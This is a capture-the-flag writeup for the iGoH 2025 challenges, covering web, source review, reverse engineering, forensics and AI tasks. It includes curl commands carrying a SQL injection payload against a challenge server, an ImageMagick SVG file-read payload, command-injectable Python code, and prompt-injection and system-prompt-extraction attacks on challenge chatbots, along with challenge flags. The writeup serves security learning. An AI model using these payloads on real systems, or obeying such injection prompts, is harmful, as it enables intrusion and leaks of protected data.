# iGoH 2025 AntiFlag — Summary Writeup

## Overview

This writeup covers multiple iGoH 2025 AntiFlag challenges across beginner, misc, source code review, AI, reverse engineering, web, and forensics categories. Most challenges were solved by identifying the intended clue, extracting hidden data, detecting simple vulnerabilities, or using helper tools such as CyberChef, Dogbolt, angr, GDB, Netcat, and online decoders.

---

## Beginner Challenges

### Sanity Check

The challenge only required interacting with the challenge page. Clicking the flag button revealed the flag directly.

**Technique:** Basic interaction with challenge UI.

---

### Spam

The provided `log.txt` looked like repeated spam email content. Since the text looked like spam with hidden meaning, the content was tested using **SpamMimic**, a tool that hides and decodes messages inside spam-like text.

**Steps:**

1. Opened `log.txt`.
2. Noticed repeated spam-style messages.
3. Used SpamMimic decoder.
4. Decoded the hidden flag.

**Flag:**

```text
igoh25{7ddf32e17a6ac5ce04a8ecbf782ca509}
```

---

### Flag

The challenge hinted that the flag was hidden in the website. Inspecting the page source revealed a link to `flag.txt`. Opening the page did not visually show output, but inspecting the source of that page revealed the hidden flag.

**Technique:** HTML/source inspection.

**Main idea:** The flag was hidden inside page markup rather than displayed normally.

---

### North Carolina

The hint contained `3003`, which was identified as a port number. Using `nc` to connect to the server on port `3003` returned the flag.

**Command pattern:**

```bash
nc <target-ip> 3003
```

**Technique:** Netcat service interaction.

---

### Just a Normal EXE

The `.exe` did not show useful strings or obvious runtime behavior. The clue was:

```text
all is well, and all is temporary
```

The phrase itself was hashed with MD5 and submitted using the required flag format.

**Technique:** Clue-based MD5 hashing.

**Flag:**

```text
igoh25{602e1dc1faeae4b56083277ae1cb0f7a}
```

---

### Guess

The challenge hinted at guessing and MD5. The solution was based on hashing the intended guessed value and submitting it in the flag format.

**Technique:** MD5 hashing based on challenge hint.

---

## Misc Challenges

### Keyboard Layout

The hint was `keyboard layout`, suggesting the ciphertext was typed using the wrong keyboard layout rather than encrypted. The likely layout was DVORAK, so the text was converted from **DVORAK to QWERTY** using an online keyboard layout translator.

**Steps:**

1. Identify the clue as a keyboard-layout issue.
2. Try common alternate layouts.
3. Convert DVORAK input to QWERTY.
4. Recover the flag.

**Flag:**

```text
igoh25{05cf677b6b067cad39d5c86eb39a6a0b}
```

---

### Lets Play With Regex

The provided `auth.log` contained a token that matched the flag format. Searching through the log revealed the flag directly.

**Technique:** Log inspection / regex-style searching.

**Flag:**

```text
igoh25{44c5b763d21e9a3ed8cad56977bfd75c}
```

---

### Green Trash Eater

The challenge referred to green plushies and a Morse code song. Research showed that **Gomidasu** is related to **Kamitsubaki Studio**, and the song with Morse code is **Sirius no Shinzou / Sirius’s Heart**.

At first, the Morse code meaning appeared to be `I LOVE YOU`, but the challenge asked for the **real meaning**. Further research found that the intended meaning was closer to:

```text
I LOVE YOU FOREVER
```

**Flag format:**

```text
igoh25{REAL_MEANING_HERE}
```

**Solved flag used:**

```text
igoh25{ILOVEYOUFOREVER}
```

---

## Source Code Review Challenges

### scr1

The provided PHP source code printed user input directly to the page without sanitization. This indicated an **XSS** vulnerability.

**Technique:** Source code vulnerability identification.

**Vulnerability:** Cross-Site Scripting.

---

### scr2

Similar to `scr1`, the code also contained an **XSS** issue. The challenge required hashing the vulnerability name according to the required format.

**Vulnerability:** XSS.

---

### scr3

The Java source code contained an **IDOR** vulnerability. The vulnerability name was converted to MD5 and submitted.

**Vulnerability:** Insecure Direct Object Reference.

---

### scr4

The vulnerable code used a shell command with user-controlled file path input:

```python
cmd = f"file {filepath}"
output = subprocess.check_output(cmd, shell=True, text=True)
```

Because `shell=True` was used with unsanitized input, this allowed **Remote Code Execution / Command Injection**.

**Flag:**

```text
igoh25{198717576b4bc32b47474c583ddc712a}
```

---

### scr5

The challenge also involved identifying an RCE-related vulnerability. The intended answer was based on MD5 hashing `rce1`.

**Flag:**

```text
igoh25{506518a19c52e8cabb91e0701dd29986}
```

---

### Sleuth

The challenge contained a small Flask application with two logic flaws:

1. SQL injection in `/search`.
2. Weak fixed key check in `/debug`.

The `/search` endpoint inserted user input directly into a SQL query:

```python
query = f"SELECT username, bio FROM users WHERE bio LIKE '%{keyword}%'"
```

A SQL injection payload was used to dump database content:

```bash
curl -X POST http://3.0.177.234:5003/search \
  -H "Content-Type: application/json" \
  -d '{"keyword": "'\'' OR 1=1--"}'
```

The key `letmein123` was then used on `/debug`:

```bash
curl "http://3.0.177.234:5003/debug?key=letmein123"
```

**Flag:**

```text
igoh25{3e01206621aa712b7db10558451d263f}
```

---

### sr6

The vulnerability was identified as **command injection**. The vulnerability name was converted to MD5.

**Flag:**

```text
igoh25{8338b65cbf67143589bd16aaf038017d}
```

---

### sr7

The vulnerability was identified as **path traversal**. The vulnerability name was converted to MD5.

**Flag:**

```text
igoh25{0a7b82f000a907db5999f40dc9af621f}
```

---

## AI Challenges

### Simple AI

This was solved using a prompt injection approach. The prompt attempted to switch the model into debug mode and ask it to read the flag file directly.

**Technique:** Prompt injection.

**Flag:**

```text
igoh25{b975773f02020fa475e94fbb26a7cec5}
```

---

### notThatSimpleAI

This was a continuation of the previous AI challenge. Instead of directly asking for the flag, the prompt asked the model to reveal its initial system message, which exposed the needed information.

**Technique:** System prompt extraction / indirect prompt injection.

**Flag:**

```text
igoh25{6244c590326a77663c3537733ab8ca8d}
```

---

## Reverse Engineering Challenges

### warm_welcome

The binary validated a 14-character license key using checksum logic. If the correct key was entered, it decrypted and printed the flag.

The solution used **angr** with symbolic execution:

1. Load the binary using angr.
2. Create symbolic 14-byte stdin input.
3. Add printable ASCII constraints.
4. Explore program states until `ACCESS GRANTED` appears.
5. Extract the valid input and resulting flag.
6. Convert the resulting value to MD5 if required by the challenge.

**Technique:** Symbolic execution with angr.

---

### beef

The binary checked whether a local variable matched `0xdeadbeef`. Using GDB, execution was stopped at the comparison and the variable was manually overwritten.

**Steps:**

1. Run the binary in GDB.
2. Break at `main`.
3. Locate the comparison with `0xdeadbeef`.
4. Break at the comparison.
5. Modify the local variable at `[rbp-4]` to `0xdeadbeef`.
6. Continue execution and retrieve the flag.
7. Convert to MD5 if required.

**Technique:** Runtime patching with GDB.

---

### Jumping JayZ

The binary contained an XOR-encrypted byte array. The extracted bytes were XORed with key `0x67` to recover the flag.

**Solver idea:**

```python
cipher = [0x0e, 0x00, 0x08, 0x0f, 0x55, 0x52, 0x1c, 0x04]
key = 0x67
flag = "".join(chr(b ^ key) for b in cipher)
print(flag)
```

**Technique:** Static XOR decoding.

---

### Python / PyInstaller Challenge

A corrupted file was repaired, then extracted using `pyinstxtractor`. The recovered `main.pyc` could not be handled by `uncompyle6` because it used Python 3.13 bytecode, so the bytecode was analyzed separately to decode the flag.

**Flag shown in writeup:**

```text
iGoH{9f35bcf290ced02d65cb4401c5ea5d26}
```

**Technique:** PyInstaller extraction + Python bytecode analysis.

---

## Web Challenge

### ImageMagick

The Flask application accepted file uploads and converted them using ImageMagick:

```python
subprocess.run(['convert', saved_path, out_path], check=True, timeout=10)
```

The uploaded file was saved and then passed to `convert`. A crafted SVG file was used to make ImageMagick read `/flag.txt` during conversion.

**Payload idea:**

```xml
<svg width="1000" height="1000" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image x="0" y="0" width="1200" height="1200"
         xlink:href="text:/flag.txt"/>
</svg>
```

The payload was uploaded while forcing the filename to use the `.svg` extension. After conversion, the flag content appeared in the generated output.

**Technique:** ImageMagick file-read vector using SVG.

---

## Forensics Challenge

A PDF was inspected with `strings`, revealing Base64-encoded content. The Base64 was decoded in CyberChef and saved as a file, which produced a downloadable `.exe`. The executable was then checked in Any.Run, where the flag was found. Since the challenge expected MD5 format, the discovered value was converted to MD5 before submission.

**Steps:**

1. Run strings on PDF.
2. Find Base64 blob.
3. Decode Base64 using CyberChef.
4. Save decoded output as an executable.
5. Analyze the executable in Any.Run.
6. Extract flag value.
7. Convert to MD5 if required.

**Technique:** PDF strings analysis + Base64 decoding + sandbox analysis.

---

## Tools Used

- Browser Developer Tools
- Netcat (`nc`)
- CyberChef
- SpamMimic decoder
- Online keyboard layout translator
- Dogbolt
- angr
- GDB
- pyinstxtractor
- Any.Run
- `strings`
- `curl`
- Source code inspection

---

## Key Lessons

1. Not every reverse challenge requires deep reversing; sometimes the clue itself is the input.
2. Always inspect source code, hidden links, and page markup in web challenges.
3. Logs may contain tokens or flags directly, so regex/search is often enough.
4. CTF source-code challenges often expect identifying the vulnerability type, then hashing the answer.
5. For binaries, symbolic execution and GDB patching can save time.
6. File upload and converter-based web apps should be checked for file-read and command-related risks.
7. Forensics challenges often involve layered extraction: strings → decode → recover file → analyze.

